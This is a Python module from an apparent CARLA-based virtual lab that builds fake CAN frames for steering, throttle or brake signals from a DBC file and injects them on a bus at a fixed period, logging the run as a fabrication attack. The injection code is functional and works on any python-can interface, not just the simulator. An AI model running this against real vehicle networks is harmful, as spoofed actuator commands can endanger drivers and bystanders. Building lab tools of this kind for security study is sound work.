"""DBC-driven fake-data fabrication for the YES-CARLA-CAN virtual lab."""

from dataclasses import dataclass
import math
import time
from typing import Callable, Optional, Tuple

import can
import cantools

from can_network.dbc import REQUIRED_SIGNALS, load_and_validate


# These actuator messages have a direct, visible effect in the CARLA window and
# contain exactly one signal, so a fabricated value defines the whole payload.
SUPPORTED_FABRICATION_MESSAGES = ("STEER", "THROTTLE", "BRAKE")


@dataclass(frozen=True)
class FabricatedCANFrame:
    """A DBC-encoded malicious frame and the semantic value used to create it."""

    message_name: str
    signal_name: str
    value: float
    message: can.Message


def _find_target(
    database: cantools.database.Database,
    message_name: Optional[str],
    signal_name: Optional[str],
) -> Tuple[cantools.database.can.Message, cantools.database.can.Signal]:
    """Resolve and validate one supported message/signal pair."""
    if message_name is None and signal_name is None:
        raise ValueError("Specify --message, --signal, or both")

    supported = {
        name: database.get_message_by_name(name)
        for name in SUPPORTED_FABRICATION_MESSAGES
    }

    dbc_message = None
    if message_name is not None:
        normalized_name = message_name.upper()
        if normalized_name not in supported:
            names = ", ".join(SUPPORTED_FABRICATION_MESSAGES)
            raise ValueError(
                f"Message '{message_name}' is not a supported visual actuator. "
                f"Choose one of: {names}"
            )
        dbc_message = supported[normalized_name]

    if signal_name is not None:
        matching = [
            (message, signal)
            for message in supported.values()
            for signal in message.signals
            if signal.name.lower() == signal_name.lower()
        ]
        if not matching:
            valid_signals = ", ".join(
                REQUIRED_SIGNALS[name] for name in SUPPORTED_FABRICATION_MESSAGES
            )
            raise ValueError(
                f"Signal '{signal_name}' was not found among supported actuator "
                f"signals: {valid_signals}"
            )
        signal_message, signal = matching[0]
        if dbc_message is not None and signal_message.frame_id != dbc_message.frame_id:
            raise ValueError(
                f"Signal '{signal.name}' does not belong to message '{dbc_message.name}'"
            )
        dbc_message = signal_message
    else:
        if dbc_message is None or len(dbc_message.signals) != 1:
            raise ValueError("The selected message requires an explicit --signal")
        signal = dbc_message.signals[0]

    return dbc_message, signal


def build_fabricated_frame(
    dbc_path: str,
    value: float,
    *,
    message_name: Optional[str] = None,
    signal_name: Optional[str] = None,
) -> FabricatedCANFrame:
    """Validate a physical signal value and encode it with the project DBC."""
    if not math.isfinite(value):
        raise ValueError("Fabricated value must be a finite number")

    database, _ = load_and_validate(dbc_path)
    dbc_message, signal = _find_target(database, message_name, signal_name)

    if signal.minimum is not None and value < signal.minimum:
        raise ValueError(
            f"Value {value:g} is below {signal.name}'s minimum ({signal.minimum:g})"
        )
    if signal.maximum is not None and value > signal.maximum:
        raise ValueError(
            f"Value {value:g} is above {signal.name}'s maximum ({signal.maximum:g})"
        )

    try:
        payload = dbc_message.encode({signal.name: value}, strict=True)
    except (cantools.database.EncodeError, ValueError, TypeError) as exc:
        raise ValueError(
            f"Could not encode {signal.name}={value:g}: {exc}"
        ) from exc

    message = can.Message(
        arbitration_id=dbc_message.frame_id,
        data=payload,
        is_extended_id=dbc_message.is_extended_frame,
    )
    return FabricatedCANFrame(
        message_name=dbc_message.name,
        signal_name=signal.name,
        value=value,
        message=message,
    )


def inject_periodically(
    bus: can.BusABC,
    fabricated: FabricatedCANFrame,
    period: float,
    duration: float,
    *,
    clock: Callable[[], float] = time.monotonic,
    sleep: Callable[[float], None] = time.sleep,
    on_inject: Optional[Callable[[int, FabricatedCANFrame], None]] = None,
) -> int:
    """Transmit a fabricated frame immediately and then at a fixed period."""
    if period <= 0:
        raise ValueError("Period must be greater than zero")
    if duration <= 0:
        raise ValueError("Duration must be greater than zero")

    start = clock()
    deadline = start + duration
    next_send = start
    sent = 0

    while next_send < deadline:
        wait_time = next_send - clock()
        if wait_time > 0:
            sleep(wait_time)

        # A fresh Message avoids carrying mutable transmission metadata (such
        # as a kernel timestamp) from one iteration into the next.
        template = fabricated.message
        bus.send(
            can.Message(
                arbitration_id=template.arbitration_id,
                data=bytes(template.data),
                is_extended_id=template.is_extended_id,
            )
        )
        sent += 1
        if on_inject is not None:
            on_inject(sent, fabricated)
        next_send = start + sent * period

    return sent


def run_fabrication_attack(
    bus: can.BusABC,
    interface: str,
    dbc_path: str,
    value: float,
    period: float,
    duration: float,
    *,
    message_name: Optional[str] = None,
    signal_name: Optional[str] = None,
    output: Callable[[str], None] = print,
) -> int:
    """Build and periodically inject one false actuator value with clear logs."""
    fabricated = build_fabricated_frame(
        dbc_path,
        value,
        message_name=message_name,
        signal_name=signal_name,
    )
    data = " ".join(f"{byte:02X}" for byte in fabricated.message.data)
    separator = "=" * 60
    output(separator)
    output("CAN Fake Data Fabrication Attack")
    output(separator)
    output(f"Interface      : {interface}")
    output(f"DBC            : {dbc_path}")
    output(f"Message        : {fabricated.message_name}")
    output(f"Signal         : {fabricated.signal_name}")
    output(f"Fake value     : {fabricated.value:g}")
    output(f"CAN ID         : 0x{fabricated.message.arbitration_id:03X}")
    output(f"Payload        : {data}")
    output(f"Period         : {period:g} s")
    output(f"Duration       : {duration:g} s")
    output("")

    def log_injection(sequence: int, frame: FabricatedCANFrame) -> None:
        output(
            f"[INJECT #{sequence:04d}] ID=0x{frame.message.arbitration_id:03X} "
            f"{frame.signal_name}={frame.value:g} DATA={data}"
        )

    sent = inject_periodically(
        bus,
        fabricated,
        period,
        duration,
        on_inject=log_injection,
    )
    output(f"\nAttack completed. Sent {sent} frame(s).")
    output(separator)
    return sent
